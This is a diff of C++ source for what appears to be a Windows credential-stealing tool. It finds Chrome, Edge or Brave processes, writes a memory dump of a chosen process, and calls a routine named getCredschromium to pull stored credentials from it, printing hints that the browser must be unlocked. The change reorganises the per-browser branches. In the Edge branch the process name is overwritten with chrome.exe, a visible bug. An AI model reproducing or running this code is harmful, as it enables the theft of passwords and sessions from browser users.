@@ -97,43 +97,104 @@ int main() {
         const char* processName=0;
         if (userInput == "chrome") {
             processName = "chrome.exe";
-        }
-        else if (userInput == "msedge") {
-            processName = "msedge.exe";
-        }
-        else if (userInput == "brave") {
-            processName = "brave.exe";
-        }
+            // Step 1: Find PIDs by process name
+            std::vector<DWORD> pids = FindPIDsByProcessName(processName);
 
-        // Step 1: Find PIDs by process name
-        std::vector<DWORD> pids = FindPIDsByProcessName(processName);
-
-        if (!pids.empty())
-        {
-            // Step 2: Get Private Working Set sizes for the found PIDs
-            std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
-
-            // Step 3: Find the PID with the second-largest Private Working Set size
-            DWORD secondLargestPID = FindSecondPID(pidSizePairs);
-
-            if (secondLargestPID != 0)
+            if (!pids.empty())
             {
-                // Step 4: Create a dump file for the process with the second-largest size
-                saveDump(secondLargestPID);
+                // Step 2: Get Private Working Set sizes for the found PIDs
+                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
+
+                // Step 3: Find the PID with the second-largest Private Working Set size
+                DWORD secondLargestPID = FindSecondPID(pidSizePairs);
+
+                if (secondLargestPID != 0)
+                {
+                    // Step 4: Create a dump file for the process with the second-largest size
+                    saveDump(secondLargestPID);
+                }
+                else
+                {
+                    std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
+                }
             }
             else
             {
-                std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
+                std::cerr << "No processes with the specified name found." << std::endl;
             }
+            std::cout << "Searching for entries.\n";
+            getCredschromium();
+            std::cout << "Done!\n";
+            std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
         }
-        else
-        {
-            std::cerr << "No processes with the specified name found." << std::endl;
+        else if (userInput == "msedge") {
+            processName = "msedge.exe";
+            processName = "chrome.exe";
+            // Step 1: Find PIDs by process name
+            std::vector<DWORD> pids = FindPIDsByProcessName(processName);
+
+            if (!pids.empty())
+            {
+                // Step 2: Get Private Working Set sizes for the found PIDs
+                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
+
+                // Step 3: Find the PID with the second-largest Private Working Set size
+                DWORD secondLargestPID = FindSecondPID(pidSizePairs);
+
+                if (secondLargestPID != 0)
+                {
+                    // Step 4: Create a dump file for the process with the second-largest size
+                    saveDump(secondLargestPID);
+                }
+                else
+                {
+                    std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
+                }
+            }
+            else
+            {
+                std::cerr << "No processes with the specified name found." << std::endl;
+            }
+            std::cout << "Searching for entries.\n";
+            getCredschromium();
+            std::cout << "Done!\n";
+            std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
+            
         }
-        std::cout << "Searching for entries.\n";
-        getCredschromium();
-        std::cout << "Done!\n";
-        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
+        else if (userInput == "brave") {
+            processName = "brave.exe";
+            // Step 1: Find PIDs by process name
+            std::vector<DWORD> pids = FindPIDsByProcessName(processName);
+
+            if (!pids.empty())
+            {
+                // Step 2: Get Private Working Set sizes for the found PIDs
+                std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
+
+                // Step 3: Find the PID with the first-largest Private Working Set size
+                DWORD firstLargestPID = FindFirstPID(pidSizePairs);
+
+                if (firstLargestPID != 0)
+                {
+                    // Step 4: Create a dump file for the process with the first-largest size
+                    saveDump(firstLargestPID);
+                }
+                else
+                {
+                    std::cerr << "No process with the first-largest Private Working Set size found." << std::endl;
+                }
+            }
+            else
+            {
+                std::cerr << "No processes with the specified name found." << std::endl;
+            }
+            std::cout << "Searching for entries.\n";
+            getCredschromium();
+            std::cout << "Done!\n";
+            std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
+        }
+
+        
     }
 
     //keeper
